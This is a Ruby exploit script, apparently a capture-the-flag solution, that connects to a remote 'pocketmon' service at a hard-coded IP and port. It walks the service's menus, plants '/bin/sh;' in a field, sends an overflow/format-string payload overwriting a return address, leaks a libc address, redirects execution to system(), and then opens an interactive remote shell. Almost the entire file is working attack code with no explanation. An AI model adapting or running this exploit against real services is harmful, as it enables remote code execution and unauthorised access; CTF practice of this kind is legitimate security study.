require 'socket'

class Exploit < TCPSocket
	def puts s
		sleep(0.1)
		super s+"\n"
	end

	def banner
		STDOUT.puts readline()
	end
	def read_menu
		
	end
	def get_pocketmon
		read_menu
		puts("1")
		5.times{ STDOUT.puts readline }
		read_menu
		puts("1")
		9.times { STDOUT.puts readline }
		puts("2")
		3.times { STDOUT.puts readline }
		puts("asdf")
	end

	def run_pocketmon
		read_menu
		puts "1"
		5.times{ STDOUT.puts readline }
		puts "1"
		read_menu
		9.times { STDOUT.puts readline }
		puts "3"
		1.times { STDOUT.puts readline }
	end

	def get_charizard
		read_menu
		puts "1"
		5.times { STDOUT.puts readline }
		4.times do
			puts "1"
			6.times do 
				STDOUT.puts readline
			end
		end
		puts "2"
		7.times do 
			STDOUT.puts readline
		end
		puts "/bin/sh;"
#=begin
		11.times do 
			STDOUT.puts readline
		end
#=end
		puts "2"
	end

	def send_payload1

		payload = "AAAAA"
		376.times do |x|
			payload += "%04X" % x
		end
		
		payload += [0x08048522].pack('<I')

		payload = payload.ljust(2128, "B")
		send_payload payload
	end

	def send_payload payload
		read_menu
		puts "5"
		10.times { STDOUT.puts readline }
		puts "2"
		write payload
		STDOUT.puts readline
	end

	def send_payload2 libc
		payload = "AAAAA"
		0x7f.times do |x|
			payload += "%04X" % x
		end
#		payload += "EEEE"
#		system = libc + 0x0003F430
		system = libc + 0x0003B990
		payload += [system].pack('<I')
		payload = payload.ljust(2128, "B")
		send_payload payload
	end
	def exploit
		STDIN.readline
		read_menu
		puts "3" 
	end

	def change_pocketmon
		read_menu
		puts "1"
		read_menu
		2.times{ STDOUT.puts readline }
		puts "4"
		11.times {STDOUT.puts readline}
		puts "2"
		4.times { STDOUT.puts readline}
		puts "1"
		1.times { |x| STDOUT.puts "%d : " %x + readline}
		d = readline
		readline
		return d[6..9].unpack('<I')[0] - 0x000498F0
		#return d[6..9].unpack('<I')[0] - 0x0004CED0  
	end

	def read_menu
		7.times{ STDOUT.puts readline }
	end
end
s = Exploit.new('54.80.112.128', 1313)
#s = Exploit.new('localhost', 1313)
s.banner
4.times { s.get_pocketmon }
2.times { s.run_pocketmon }
s.get_charizard
s.send_payload1
libc = s.change_pocketmon
puts "[*] Libc : %x" % libc
s.send_payload2 libc
s.exploit

Thread.new do
	loop do
	puts s.readline
	end
end
s.puts "id"

loop do
	s.puts STDIN.readline()
end

=begin
#s = Exploit.new('54.80.112.128', 1313)
4.times { s.get_pocketmon }
2.times { s.run_pocketmon }
s.get_charizard
s.send_payload
s.change_pocketmon

s.send_payload2
s.exploit
sleep(10)
=begin
loop do
	x = STDIN.readline()
	p x
	s.puts(x)
end
=end
